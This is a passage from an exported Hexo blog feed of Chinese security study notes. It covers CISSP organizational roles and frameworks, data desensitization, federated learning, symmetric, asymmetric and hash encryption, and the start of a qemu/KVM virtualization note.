href="#组织的角色与责任" class="headerlink" title="组织的角色与责任"></a>组织的角色与责任</h4><p>安全角色是个人在组织内的安全实施和管理总体方案中扮演的角色。</p><p>典型安全环境中存在的常见安全角色：</p><p><strong>高级管理者</strong></p><p>组织所有着（高级管理者）角色被分配给最终对组织安全的维护负责及最关心资产保护的人员。</p><p>高级管理者需要对安全策略授权和支持，对安全解决方案的总体成功或失败负责。</p><p>很少直接实施安全解决方案，大多情况下，实施会被分配给安全专业人员。</p><p><strong>安全专业人员</strong></p><p>安全专业人员、信息安全官（InfoSec）或计算机事件响应小组（computer incident response team，CIRT）的角色被分配给受过培训和经验丰富的网络、系统和安全工程师们，负责落实高级管理者下达的指示。</p><p>职责是保证安全性，包括编写和执行安全策略。</p><p>安全专业人员是实施者，决策者是高级管理者。</p><p><strong>资产所有者</strong></p><p>资产所有者（asset owner ）角色将被分配在安全解决方案中负责布置和保护信息分类的人员。</p><p>资产所有者通常是高级管理人员，最终对资产保护负责。</p><p>资产所有者通常将实际数据管理任务的责任委托给托管员。</p><p><strong>托管员</strong></p><p>托管员（custodian）角色被分配给负责执行安全策略与高级管理者规定的保护任务的人员。</p><p>托管员执行所有必要的活动，为实现数据的 CIA 三元组（保密性、完整性和可用性）提供充分的数据支持，并履行上级管理部门委派的要求和职责。</p><p><strong>用户</strong></p><p>用户（最终用户或操作员）角色被分配给任何能访问安全系统的人员。</p><p>用户的访问权限与他们的工作任务相关并受其限制，只有足以执行工作岗位所需的任务的访问权限（最小特权原则）。</p><p><strong>审计人员</strong></p><p>审计人员（auditor）负责审查和验证安全策略是否被正确执行，以及相关的安全解决方案是否完备。</p><p>审计人员出具由高级管理者审核的合规性和有效性报告。</p><p>高级管理者将报告中发现的问题当作新的工作内容分配给安全专业人员或托管员。</p><h4 id="安全控制框架"><a href="#安全控制框架" class="headerlink" title="安全控制框架"></a>安全控制框架</h4><p>安全规划步骤中的第一步（也是最重要的一步），就是考虑组织所希望的安全解决方案的总体安全控制框架或结构。</p><p>应用最广泛的安全控制框架之一是信息和相关技术控制目标（COBIT）</p><p>COBIT由ISACA编制的一套记录IT最佳安全实践的文档，规定了安全控制的目标和需求，并鼓励将IT安全思路映射到业务目标。</p><p>COBIT基于六个关键原则进行企业IT治理和管理：</p><p>原则1：为利益相关方创造价值</p><p>原则2：采用整体分析法</p><p>原则3：动态地治理系统</p><p>原则4：把治理从管理中分离出来</p><p>原则5：根据企业需求量身定制</p><p>原则6：采用端到端的治理系统</p><p>COBIT还可以作为审计人员的工作指南。</p><p>IT安全其他的标准和指南：</p><p><strong>NIST SP 800-53 Rev.5 信息系统和组织的安全和隐私控制</strong></p><p>包含美国政府为组织安全提供的通用性建议</p><p><strong>互联网安全中心（CIS）</strong></p><p>提供针对操作系统、应用程序和硬件的安全配置指引。</p><p><strong>NIST 风险管理框架（RMF）</strong></p><p>对联邦机构制定了强制性要求。</p><p>RMF分为六个阶段：分类、选择、实施、评估、授权和监控。</p><p><strong>NIST 网络安全框架（CSF）</strong></p><p>为关键基础设施和商业组织而设计，由识别、保护、检测、响应和恢复五个功能构成。</p><p><strong>ISO&#x2F;IEC 27000系列</strong></p><p>国际标准，可作为实施组织信息安全及相关管理实践的基础。</p><p><strong>信息技术基础设施库（Information Technology Infrastructure Library，ITIL）</strong></p><p>最初由英国政府制定，是一套被推荐的优化IT服务以及支持业务增长、转型和变革的最佳实践。</p><p>重点是理解IT和安全需求如何与组织目标进行集成一致。</p><h4 id="应尽关心和尽职审查"><a href="#应尽关心和尽职审查" class="headerlink" title="应尽关心和尽职审查"></a>应尽关心和尽职审查</h4><p>计划安全重要的原因之一是需要进行应尽关心和尽职审查。</p><p>应尽关心是指制定计划、策略和流程以保护组织的利益。</p><p>尽职审查指的是实践那些维持应尽关心工作的活动。</p><p>对于考试</p><p>应尽关心是指制定一种正式的安全框架，其中包含安全策略、标准、基线、指南和程序。</p><p>尽职审查是指将这种安全框架持续应用到组织的IT基础设施上。</p><p>运营安全指组织内的所有责任相关方持续实施应尽关心和尽职审查。</p><p>应尽关心是知道应该做什么并为此制订计划。</p><p>尽职审查是在正确的时间采取正确的行为。</p><p>在发生安全事故时，拿出应尽关心和尽职审查的证据是证明没有疏忽的唯一方法。</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>datasec_base</title>
    <link href="/2024/12/16/security/datasec/datasec_base/"/>
    <url>/2024/12/16/security/datasec/datasec_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="数据安全技术"><a href="#数据安全技术" class="headerlink" title="数据安全技术"></a>数据安全技术</h2><h3 id="数据加密技术"><a href="#数据加密技术" class="headerlink" title="数据加密技术"></a>数据加密技术</h3><h3 id="数据脱敏技术"><a href="#数据脱敏技术" class="headerlink" title="数据脱敏技术"></a>数据脱敏技术</h3><h4 id="数据屏蔽（Masking）"><a href="#数据屏蔽（Masking）" class="headerlink" title="数据屏蔽（Masking）"></a>数据屏蔽（Masking）</h4><h5 id="数据屏蔽原理"><a href="#数据屏蔽原理" class="headerlink" title="数据屏蔽原理"></a>数据屏蔽原理</h5><p>将敏感数据的部分或全部内容通过特定的字符或符号替换真实信息。</p><p>例如：用*或x替换手机号指定几位</p><p>在实现时，要确定屏蔽的位置和屏蔽字符的规则，以达到既能隐藏敏感信息，又能保留数据部分特征的目的。</p><h5 id="数据屏蔽场景及优势"><a href="#数据屏蔽场景及优势" class="headerlink" title="数据屏蔽场景及优势"></a>数据屏蔽场景及优势</h5><p>能够在保持数据格式完整性的同时，有效地隐藏敏感信息，让用户对数据的大致格式和类型有直观的了解。</p><h4 id="数据替换（Substitution）"><a href="#数据替换（Substitution）" class="headerlink" title="数据替换（Substitution）"></a>数据替换（Substitution）</h4><h5 id="数据替换原理"><a href="#数据替换原理" class="headerlink" title="数据替换原理"></a>数据替换原理</h5><p>将敏感数据替换为虚拟的或通用的数据。</p><p>例如：</p><p>真实姓名替换为张三、李四这种通用名字</p><p>详细地址替换为大致区域</p><h5 id="数据替换场景及优势"><a href="#数据替换场景及优势" class="headerlink" title="数据替换场景及优势"></a>数据替换场景及优势</h5><p>适用于对数据真实性要求不高，但需要保护隐私的场景，例如软件开发过程中测试数据生成。</p><p>操作简单，可快速对大量数据操作，也可以在一定程度上保留数据格式和类型</p><h4 id="数据扰动（Perturbation）"><a href="#数据扰动（Perturbation）" class="headerlink" title="数据扰动（Perturbation）"></a>数据扰动（Perturbation）</h4><h5 id="数据扰动原理"><a href="#数据扰动原理" class="headerlink" title="数据扰动原理"></a>数据扰动原理</h5><p>对原始数据进行随机化处理，添加一定的随机误差，使得敏感信息无法被还原</p><h5 id="数据扰动场景及优势"><a href="#数据扰动场景及优势" class="headerlink" title="数据扰动场景及优势"></a>数据扰动场景及优势</h5><h4 id="数据匿名化（Anonymization）"><a href="#数据匿名化（Anonymization）" class="headerlink" title="数据匿名化（Anonymization）"></a>数据匿名化（Anonymization）</h4><h4 id="数据加密（Encryption）"><a href="#数据加密（Encryption）" class="headerlink" title="数据加密（Encryption）"></a>数据加密（Encryption）</h4><h3 id="数据访问控制技术"><a href="#数据访问控制技术" class="headerlink" title="数据访问控制技术"></a>数据访问控制技术</h3><h4 id="RBAC（基于角色的访问控制）模型"><a href="#RBAC（基于角色的访问控制）模型" class="headerlink" title="RBAC（基于角色的访问控制）模型"></a>RBAC（基于角色的访问控制）模型</h4><h4 id="ABAC（基于属性的访问控制）模型"><a href="#ABAC（基于属性的访问控制）模型" class="headerlink" title="ABAC（基于属性的访问控制）模型"></a>ABAC（基于属性的访问控制）模型</h4><h3 id="隐私计算技术"><a href="#隐私计算技术" class="headerlink" title="隐私计算技术"></a>隐私计算技术</h3><h4 id="隐私计算定义"><a href="#隐私计算定义" class="headerlink" title="隐私计算定义"></a>隐私计算定义</h4><p>是一种在保护数据隐私的前提下，实现数据价值挖掘和利用的技术体系。</p><p>允许数据所有者在不泄漏敏感信息的情况下，对数据进行计算、分析和共享等操作。</p><h4 id="隐私计算主要技术方向"><a href="#隐私计算主要技术方向" class="headerlink" title="隐私计算主要技术方向"></a>隐私计算主要技术方向</h4><h5 id="同态加密（Homomorphic-Encryption）"><a href="#同态加密（Homomorphic-Encryption）" class="headerlink" title="同态加密（Homomorphic Encryption）"></a>同态加密（Homomorphic Encryption）</h5><h6 id="同态加密原理"><a href="#同态加密原理" class="headerlink" title="同态加密原理"></a>同态加密原理</h6><h5 id="安全多方计算"><a href="#安全多方计算" class="headerlink" title="安全多方计算"></a>安全多方计算</h5><h5 id="联邦学习（Federated-Learning）"><a href="#联邦学习（Federated-Learning）" class="headerlink" title="联邦学习（Federated Learning）"></a>联邦学习（Federated Learning）</h5><h6 id="联邦学习原理"><a href="#联邦学习原理" class="headerlink" title="联邦学习原理"></a>联邦学习原理</h6><p>一种分布式机器学习方法，允许多个数据源（如不同的设备或机构）在本地数据上训练模型，然后将模型参数（如神经网络的权重）进行共享聚合，而不是直接共享数据。这样可以在保护数据隐私的基础上，利用各方的数据来训练一个更强大的全局模型。</p><h6 id="联邦学习分类"><a href="#联邦学习分类" class="headerlink" title="联邦学习分类"></a>联邦学习分类</h6><p><strong>集中式联邦学习</strong>：中央服务器负责协调学习过程，包括选择参与节点和聚合模型更新。</p><p><strong>去中心化联邦学习</strong>：允许节点自主协调获取全局模型，避免单点故障。</p><p><strong>异构联邦学习</strong>：支持具有不同计算和通信能力的异构本地模型训练，同时生成准确的全局推理模型。</p><h6 id="联邦学习一般流程"><a href="#联邦学习一般流程" class="headerlink" title="联邦学习一般流程"></a>联邦学习一般流程</h6><p>1、<strong>问题定义与参与方确定</strong></p><p><strong>明确目标</strong>：首先需要确定联邦学习要解决的问题，目标决定了后续的数据需求和模型类型。</p><p><strong>识别参与方</strong>：找出拥有相关数据且愿意参与联邦学习的各方。这些参与方可以是不同的机构（如多家医院、银行），也可以是不同的设备（如智能手机、物联网设备）。参与方需要具备一定的数据存储和计算能力，以便在本地进行数据处理。</p><p>2、<strong>数据准备与预处理</strong></p><p><strong>本地数据收集</strong>：每个参与方在本地收集用于训练模型的数据。这些数据通常是敏感的，不会离开本地设备或机构。</p><p><strong>数据清洗与特征工程（本地）</strong>：参与方在本地对数据进行清洗，去除噪声、错误数据和重复数据。同时，进行特征工程，如提取有用的特征、对特征进行编码或归一化等操作。</p><p>3、<strong>模型初始化与分发</strong></p><p><strong>模型选择与初始化</strong>：由协调者（可以是一个中立的第三方机构，也可以是参与方中的主导者）选择合适的机器学习模型架构，如神经网络、决策树等，并进行初始化，如设置权重和偏置参数。</p><p><strong>模型分发</strong>：将初始化后的模型参数发送给各个参与方。</p><p>4、<strong>本地模型训练</strong></p><p><strong>利用本地数据训练</strong>：各参与方在本地使用自己的数据对收到的模型进行训练。在训练过程中，模型根据本地数据的特征和标签，通过优化算法（如梯度下降）来调整模型参数，使模型在本地数据上的性能（如准确率、损失函数值）得到优化。</p><p><strong>计算梯度更新（本地）</strong>：在训练过程中，参与方计算模型参数的梯度更新。梯度表示模型参数对损失函数的变化率，用于指导模型参数的调整方向。</p><p>5、<strong>模型参数聚合</strong></p><p><strong>上传梯度更新或模型参数</strong>：参与方将本地计算的梯度更新或训练后的模型参数发送给协调者。这一步骤需要注意数据传输的安全性，通常会采用加密等手段来保护数据。例如，通过同态加密技术对梯度更新进行加密，使得协调者在接收数据时无法获取梯度中的隐私信息。</p><p><strong>聚合操作（协调者）</strong>：协调者收到来自各个参与方的梯度更新或模型参数后，进行聚合操作。对于梯度更新，聚合操作可以是简单的加权平均（根据参与方数据量、数据质量等因素确定权重）；对于模型参数，聚合操作可能更复杂，如对不同模型的参数进行融合。例如，在简单的线性回归模型联邦学习中，协调者将各参与方上传的梯度更新进行加权平均，然后更新全局模型的参数。</p><p>6、<strong>模型更新与评估</strong></p><p><strong>更新全局模型（协调者）</strong>：根据聚合后的结果，协调者更新全局模型的参数。</p><p><strong>模型评估（可选）</strong>：可以对更新后的全局模型进行评估，评估指标可以是准确率、召回率、F1 - 分数等（取决于具体的任务）。评估数据可以是预留的测试数据（这些测试数据也可以通过联邦学习的方式获取），或者是模拟数据。通过评估来判断模型是否达到预期的性能目标，如果没有达到，可能需要调整模型架构、训练策略或联邦学习的参数。</p><p>7、<strong>迭代训练与优化</strong></p><p><strong>循环训练过程</strong>：重复上述本地模型训练、模型参数聚合、模型更新与评估的步骤，直到全局模型达到满意的性能或者达到预定的训练次数。在每次迭代中，模型不断吸收各参与方的本地数据信息，逐步优化性能。</p><p><strong>优化调整（可选）</strong>：在迭代过程中，可以根据模型的性能表现和训练情况，对联邦学习的各个环节进行优化调整。例如，调整参与方的权重、更新数据预处理方法、改变模型架构等，以提高模型的收敛速度和最终性能。</p><h6 id="联邦学习优势"><a href="#联邦学习优势" class="headerlink" title="联邦学习优势"></a>联邦学习优势</h6><p><strong>保护隐私</strong>：由于数据不需要上传到中央服务器，用户的隐私得到了很好的保护。</p><p><strong>减少数据传输</strong>：只需传输模型参数，显著减少了数据传输的量。</p><p><strong>提高模型的泛化能力</strong>：由于模型是在不同设备上训练的，这些设备的数据分布可能会有所不同，因此最终的全局模型能够更好地适应不同用户的需求。</p><p><strong>利用边缘计算</strong>：联邦学习可以利用用户设备的计算能力，在边缘进行数据处理，减轻了中央服务器的负担。</p><p><strong>适应动态环境</strong>：联邦学习能够快速适应动态变化的环境。</p><h6 id="联邦学习应用"><a href="#联邦学习应用" class="headerlink" title="联邦学习应用"></a>联邦学习应用</h6><p>移动设备的个性化推荐系统</p><p>医疗领域的疾病预测模型</p><p>金融行业的反欺诈模型</p><h6 id="联邦学习挑战"><a href="#联邦学习挑战" class="headerlink" title="联邦学习挑战"></a>联邦学习挑战</h6><p><strong>数据异构性</strong>：不同设备的数据分布可能存在差异，这种异构性会影响模型的训练效果。</p><p><strong>通信效率</strong>：由于设备的网络环境可能不稳定，因此在联邦学习中，需要考虑如何减少通信开销。</p><p><strong>安全性</strong>：尽管联邦学习可以保护用户隐私，但仍然需要防范一些潜在的安全威胁，比如模型反向工程和恶意设备的影响。</p><h5 id="可信执行环境"><a href="#可信执行环境" class="headerlink" title="可信执行环境"></a>可信执行环境</h5><h5 id="差分隐私"><a href="#差分隐私" class="headerlink" title="差分隐私"></a>差分隐私</h5><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><p>【1】联邦学习：去中心化的机器学习新模式 川后静波 吴建明利驰软件 2024年10月09日 22:13</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2MDg5NzE5NA==&mid=2247491179&idx=1&sn=bfdb40f3d7bfef6b4ea294b7a6a96120&chksm=cf6915a369d37b516940c2c48eaae5ec7010335d389422a25ffbd87f910cefa04829fd5bd6d9#rd">https://mp.weixin.qq.com/s?__biz=Mzg2MDg5NzE5NA==&amp;mid=2247491179&amp;idx=1&amp;sn=bfdb40f3d7bfef6b4ea294b7a6a96120&amp;chksm=cf6915a369d37b516940c2c48eaae5ec7010335d389422a25ffbd87f910cefa04829fd5bd6d9#rd</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>datasec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>base</tag>
      
      <tag>datasec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>datasec_数据加密</title>
    <link href="/2024/12/16/security/datasec/datasec_%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"/>
    <url>/2024/12/16/security/datasec/datasec_%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="数据加密技术"><a href="#数据加密技术" class="headerlink" title="数据加密技术"></a>数据加密技术</h1><h2 id="对称加密技术"><a href="#对称加密技术" class="headerlink" title="对称加密技术"></a>对称加密技术</h2><h3 id="对称加密技术原理"><a href="#对称加密技术原理" class="headerlink" title="对称加密技术原理"></a>对称加密技术原理</h3><p>对称加密是指加密和解密使用相同密钥的加密算法。</p><p>发送方和接收方必须共享同一个密钥。</p><p>数据发送者通过密钥对数据进行加密，数据接收方通过密钥对数据进行解密</p><h3 id="对称加密技术优点"><a href="#对称加密技术优点" class="headerlink" title="对称加密技术优点"></a>对称加密技术优点</h3><h4 id="加密速度快"><a href="#加密速度快" class="headerlink" title="加密速度快"></a>加密速度快</h4><p>相同密钥加解密</p><h4 id="算法简单易懂"><a href="#算法简单易懂" class="headerlink" title="算法简单易懂"></a>算法简单易懂</h4><p>原理直观，容易理解和实现</p><h3 id="对称加密技术缺点"><a href="#对称加密技术缺点" class="headerlink" title="对称加密技术缺点"></a>对称加密技术缺点</h3><h4 id="密钥管理困难"><a href="#密钥管理困难" class="headerlink" title="密钥管理困难"></a>密钥管理困难</h4><p>由于相同密钥，存在密钥分发，需要保障密钥安全性，尤其在密钥传输和存储阶段</p><h4 id="安全性相对较低"><a href="#安全性相对较低" class="headerlink" title="安全性相对较低"></a>安全性相对较低</h4><p>由于相同密钥，需要加解密双方共享密钥，如果密钥被泄露，就丧失了安全性</p><h3 id="常见对称加密算法"><a href="#常见对称加密算法" class="headerlink" title="常见对称加密算法"></a>常见对称加密算法</h3><h4 id="DES（数据加密标准）"><a href="#DES（数据加密标准）" class="headerlink" title="DES（数据加密标准）"></a>DES（数据加密标准）</h4><p>经典的对称加密算法，将数据分为64位的块进行加密。</p><p>由于密钥长度较短，只有56位，目前已被认为安全性不够</p><h4 id="3DES（3重数据加密标准）"><a href="#3DES（3重数据加密标准）" class="headerlink" title="3DES（3重数据加密标准）"></a>3DES（3重数据加密标准）</h4><p>DES加密算法改进版，对数据进行 3 次DES加密操作，使用两个或三个56位密钥</p><p>安全性有所增加，加密速度相对较慢</p><h4 id="AES（高级数据加密标准）"><a href="#AES（高级数据加密标准）" class="headerlink" title="AES（高级数据加密标准）"></a>AES（高级数据加密标准）</h4><p>目前广泛使用的对称加密算法之一</p><p>支持128位、192位和256位的密钥长度，能够对128位的数据进行高效加密</p><p>例如：存储敏感信息（数据密码）、网络通信（VPN数据传输）常用AES加密</p><h3 id="对称加密密钥传输安全"><a href="#对称加密密钥传输安全" class="headerlink" title="对称加密密钥传输安全"></a>对称加密密钥传输安全</h3><h4 id="应用密钥交换协议"><a href="#应用密钥交换协议" class="headerlink" title="应用密钥交换协议"></a>应用密钥交换协议</h4><h5 id="Diffie-Hellman-密钥交换协议"><a href="#Diffie-Hellman-密钥交换协议" class="headerlink" title="Diffie - Hellman 密钥交换协议"></a>Diffie - Hellman 密钥交换协议</h5><p>一种常用的密钥交换方法，它允许双方在不安全的通信信道上建立共享的密钥。其核心是基于离散对数问题的数学原理。</p><h5 id="椭圆曲线-Diffie-Hellman（ECDH）密钥交换协议"><a href="#椭圆曲线-Diffie-Hellman（ECDH）密钥交换协议" class="headerlink" title="椭圆曲线 Diffie - Hellman（ECDH）密钥交换协议"></a>椭圆曲线 Diffie - Hellman（ECDH）密钥交换协议</h5><p>Diffie - Hellman 密钥交换协议的一种变体，它基于椭圆曲线密码学（ECC）。在椭圆曲线上，点的运算（如加法和乘法）具有特定的数学性质。通信双方通过在椭圆曲线上进行点的运算来交换密钥。</p><h4 id="使用安全通道进行传输"><a href="#使用安全通道进行传输" class="headerlink" title="使用安全通道进行传输"></a>使用安全通道进行传输</h4><h5 id="SSL-TLS-协议保障"><a href="#SSL-TLS-协议保障" class="headerlink" title="SSL&#x2F;TLS 协议保障"></a>SSL&#x2F;TLS 协议保障</h5><p>SSL 安全套接字</p><p>TLS 传输层安全</p><p>SSL&#x2F;TLS 协议采用多种加密和认证技术。在加密方面，它可以使用公钥加密（如 RSA）来交换对称加密密钥，确保密钥的保密性。在认证方面，通过数字证书来验证通信双方的身份，防止中间人攻击。数字证书包含了公钥和相关机构的签名，接收方可以通过验证签名来确认公钥的真实性，从而保证密钥传输是在合法的双方之间进行。</p><h5 id="VPN（虚拟专用网络）辅助传输"><a href="#VPN（虚拟专用网络）辅助传输" class="headerlink" title="VPN（虚拟专用网络）辅助传输"></a>VPN（虚拟专用网络）辅助传输</h5><p>VPN 采用多种安全技术，如 IPsec 协议。IPsec 可以对数据进行加密和认证，确保数据的保密性、完整性和来源真实性。在传输对称密钥时，通过 IPsec 的加密功能，能够防止密钥在传输过程中被窃取或篡改，同时通过认证功能防止非法用户接入 VPN 通道获取密钥。</p><h4 id="应用密钥的预共享和密钥管理系统"><a href="#应用密钥的预共享和密钥管理系统" class="headerlink" title="应用密钥的预共享和密钥管理系统"></a>应用密钥的预共享和密钥管理系统</h4><h5 id="预共享密钥（PSK）"><a href="#预共享密钥（PSK）" class="headerlink" title="预共享密钥（PSK）"></a>预共享密钥（PSK）</h5><p>预共享密钥是一种在通信之前预先共享密钥的方式。</p><p>虽然预共享密钥简单方便，但也存在一定的安全风险。如果密钥被泄露，整个通信系统的安全将受到威胁。因此，对于预共享密钥的存储和使用需要采取严格的安全措施，如将密钥存储在安全的硬件设备（如硬件安全模块 - HSM）中，限制密钥的访问权限，并且定期更换密钥。</p><h5 id="密钥管理系统（KMS）"><a href="#密钥管理系统（KMS）" class="headerlink" title="密钥管理系统（KMS）"></a>密钥管理系统（KMS）</h5><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>密钥管理系统是一种集中管理密钥的软件或硬件解决方案。它可以生成、存储、分发、更新和销毁密钥。在对称加密密钥传输过程中，KMS 可以发挥重要作用。例如，KMS 首先生成对称加密密钥，然后通过安全的方式（如上述的密钥交换协议或安全通道）将密钥分发给需要的用户或设备。同时，KMS 可以记录密钥的使用情况，对密钥进行加密存储，并且在密钥可能泄露或过期时及时进行更新或销毁。</p><h6 id="安全增强措施"><a href="#安全增强措施" class="headerlink" title="安全增强措施"></a>安全增强措施</h6><p>KMS 本身采用多种安全措施来保证密钥传输的安全。它可以使用多层加密技术，如对存储的密钥进行加密，并且在传输过程中再次加密。同时，KMS 具有严格的访问控制机制，只有经过授权的用户或系统才能访问和操作密钥，并且所有操作都有详细的审计记录，以确保密钥传输和使用过程的安全性。</p><h2 id="非对称加密技术"><a href="#非对称加密技术" class="headerlink" title="非对称加密技术"></a>非对称加密技术</h2><h3 id="非对称加密技术原理"><a href="#非对称加密技术原理" class="headerlink" title="非对称加密技术原理"></a>非对称加密技术原理</h3><p>非对称加密使用一对密钥，即公钥和私钥</p><p>数据加密方面：加密方使用公钥进行加密，解密方使用私钥进行解密</p><p>数据签名方面：签名方使用私钥进行签名，解密方使用公钥进行解密验证真实性</p><h3 id="常见非对称加密算法"><a href="#常见非对称加密算法" class="headerlink" title="常见非对称加密算法"></a>常见非对称加密算法</h3><h4 id="RSA（Rivest-Shamir-Adleman）"><a href="#RSA（Rivest-Shamir-Adleman）" class="headerlink" title="RSA（Rivest - Shamir - Adleman）"></a>RSA（Rivest - Shamir - Adleman）</h4><p>最著名的非对称加密算法之一</p><p>基于数论中的大整数分解问题，密钥长度通常在1024位以上</p><p>例如：在数字证书、SSL&#x2F;TLS 协议（用于验证服务器身份）以及安全电子邮件（如 PGP 加密）等场景中广泛使用 RSA</p><h4 id="ECC（椭圆曲线密码体制）"><a href="#ECC（椭圆曲线密码体制）" class="headerlink" title="ECC（椭圆曲线密码体制）"></a>ECC（椭圆曲线密码体制）</h4><p>基于椭圆曲线离散对数问题</p><p>相比于RSA，可以使用更短的密钥长度达到相同甚至更高的安全性</p><p>例如：在资源受限的设备（如移动设备、物联网设备）中，ECC 因其高效性而被广泛应用于安全通信和身份认证。</p><h3 id="非对称加密技术优势"><a href="#非对称加密技术优势" class="headerlink" title="非对称加密技术优势"></a>非对称加密技术优势</h3><h4 id="安全性高"><a href="#安全性高" class="headerlink" title="安全性高"></a>安全性高</h4><p>非对称加密使用公钥和私钥进行加密和解密，公钥公开，私钥保密，提高了数据传输的安全性</p><h4 id="密钥管理方便"><a href="#密钥管理方便" class="headerlink" title="密钥管理方便"></a>密钥管理方便</h4><p>在通信双方之间，不需要共享密钥，只需交换公钥即可进行加密通信，简化了密钥管理和分发的过程</p><h4 id="数字签名功能"><a href="#数字签名功能" class="headerlink" title="数字签名功能"></a>数字签名功能</h4><p>非对称加密可以用于数字签名，验证数据的完整性和真实性，保证通信的安全性</p><h3 id="非对称加密技术劣势"><a href="#非对称加密技术劣势" class="headerlink" title="非对称加密技术劣势"></a>非对称加密技术劣势</h3><h4 id="性能较低"><a href="#性能较低" class="headerlink" title="性能较低"></a>性能较低</h4><p>相较对称加密，非对称加密算法的加密解密速度较慢，特别是在处理大量数据时，会造成性能上的损耗</p><h4 id="密钥长度较长"><a href="#密钥长度较长" class="headerlink" title="密钥长度较长"></a>密钥长度较长</h4><p>为了确保安全性，非对称加密需要使用较长的密钥长度，相对占用的存储空间和传输开销较大</p><h4 id="部分算法安全性问题"><a href="#部分算法安全性问题" class="headerlink" title="部分算法安全性问题"></a>部分算法安全性问题</h4><p>非对称加密算法，如RSA的安全性基于数学难题，如大素数分解，随着计算效率的提高，存在被攻破的风险</p><h3 id="非对称加密技术应用场景"><a href="#非对称加密技术应用场景" class="headerlink" title="非对称加密技术应用场景"></a>非对称加密技术应用场景</h3><p>数字签名</p><p>身份认证</p><p>密钥交换：可以通过非对称加密安全地交换对称加密所需的密钥</p><h2 id="哈希加密技术"><a href="#哈希加密技术" class="headerlink" title="哈希加密技术"></a>哈希加密技术</h2><h3 id="哈希加密技术原理"><a href="#哈希加密技术原理" class="headerlink" title="哈希加密技术原理"></a>哈希加密技术原理</h3><p>单向加密算法</p><p>将任意长度数据转换为固定长度的哈希值，也称为消息摘要</p><p>具有不可逆性，即无法从哈希值反推出原始数据</p><p>验证数据完整性：相同的数据输入会产生相同的哈希值</p><h3 id="哈希加密技术算法"><a href="#哈希加密技术算法" class="headerlink" title="哈希加密技术算法"></a>哈希加密技术算法</h3><h4 id="MD5（消息摘要算法第5版）"><a href="#MD5（消息摘要算法第5版）" class="headerlink" title="MD5（消息摘要算法第5版）"></a>MD5（消息摘要算法第5版）</h4><p>曾被广泛应用</p><p>由于安全性存在严重的问题，如容易产生碰撞，即不同的数据可能产生相同的哈希值</p><p>目前已不建议用于安全敏感的场合</p><h4 id="SHA-1（安全哈希算法1）"><a href="#SHA-1（安全哈希算法1）" class="headerlink" title="SHA-1（安全哈希算法1）"></a>SHA-1（安全哈希算法1）</h4><p>160 位的哈希值长度在面对强大的计算能力攻击时可能不够安全</p><h4 id="SHA-2（安全哈希算法2）系列"><a href="#SHA-2（安全哈希算法2）系列" class="headerlink" title="SHA-2（安全哈希算法2）系列"></a>SHA-2（安全哈希算法2）系列</h4><p>SHA-224</p><p>SHA-256</p><p>目前安全性能较高的哈希算法</p><p>SHA - 256 常用于区块链技术（如比特币中用于验证交易的完整性）、文件完整性验证（如下载文件时验证文件是否被篡改）等场景</p><h4 id="SHA-3（安全哈希算法3）"><a href="#SHA-3（安全哈希算法3）" class="headerlink" title="SHA-3（安全哈希算法3）"></a>SHA-3（安全哈希算法3）</h4><h3 id="哈希加密技术应用场景"><a href="#哈希加密技术应用场景" class="headerlink" title="哈希加密技术应用场景"></a>哈希加密技术应用场景</h3><p>密码存储</p><p>数据完整性验证</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>datasec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>datasec</tag>
      
      <tag>数据加密</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tthours</title>
    <link href="/2024/12/16/tthours/"/>
    <url>/2024/12/16/tthours/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p><img src="/image-20241224173609469.png" alt="image-20241224173609469"></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cloudsec_base</title>
    <link href="/2024/12/16/security/cloudsec/cloudsec_base/"/>
    <url>/2024/12/16/security/cloudsec/cloudsec_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="云原生基础概念"><a href="#云原生基础概念" class="headerlink" title="云原生基础概念"></a>云原生基础概念</h1><h2 id="qemu-kvm"><a href="#qemu-kvm" class="headerlink" title="qemu-kvm"></a>qemu-kvm</h2><h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><h4 id="qemu原理"><a href="#qemu原理" class="headerlink" title="qemu原理"></a>qemu原理</h4><p>qemu 是通过软件实现的虚拟化模拟器，可以模拟大多数硬件设备，可以通过 qemu 模拟虚拟机，模拟出来的虚拟机与之交互的硬件就是 qemu 模拟出来的硬件，qemu 模拟的硬件将从虚拟机接收过来的指令转译给真正的硬件。</p><h4 id="qemu优势"><a href="#qemu优势" class="headerlink" title="qemu优势"></a>qemu优势</h4><h4 id="qemu劣势"><a href="#qemu劣势" class="headerlink" title="qemu劣势"></a>qemu劣势</h4><p>由于 qemu 是基于软件的，指令需要 qemu 进行转译，所以速度会相对较慢一些。</p><h3 id="KVM"><a href="#KVM" class="headerlink" title="KVM"></a>KVM</h3><p>kernel-based Virtual Machine</p><h4 id="KVM原理"><a href="#KVM原理" class="headerlink" title="KVM原理"></a>KVM原理</h4><p>硬件辅助的虚拟化技术。</p><p>kvm 是 linux 的内核模块,用于模拟 CPU 和内存。</p><h4 id="KVM优势"><a href="#KVM优势" class="headerlink" title="KVM优势"></a>KVM优势</h4><p>由于是基于linux内核的，所以模拟出来的虚拟机的 CPU 指令会直接和真正的硬件进行交互，因此速度会更加快速</p><h4 